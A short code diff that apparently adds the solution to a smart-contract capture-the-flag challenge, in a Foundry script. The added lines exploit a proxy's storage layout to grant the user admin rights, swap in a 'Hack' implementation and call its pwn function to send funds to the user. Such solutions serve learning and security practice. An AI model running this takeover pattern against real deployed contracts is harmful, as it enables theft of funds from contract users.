@@ -5,6 +5,7 @@ import {Script, console2} from "forge-std/Script.sol";
 
 import {Database} from "../src/Database.sol";
 import {Proxy} from "../src/Proxy.sol";
+import {Hack} from "../src/Hack.sol";
 
 contract ResolutionScript is Script {
     Database internal implementation;
@@ -30,6 +31,14 @@ contract ResolutionScript is Script {
 
     function solution() internal {
         // write your solution here !
+        Database(address(proxy)).write(
+            uint256(uint160(address(user))),
+            bytes32(uint256(uint8(1)))
+        );
+
+        proxy.addAdmin(address(user));
+        proxy.setImplementation(address(new Hack()));
+        Hack(address(proxy)).pwn(payable(user));
     }
 
     function isSolved() internal view returns (bool) {
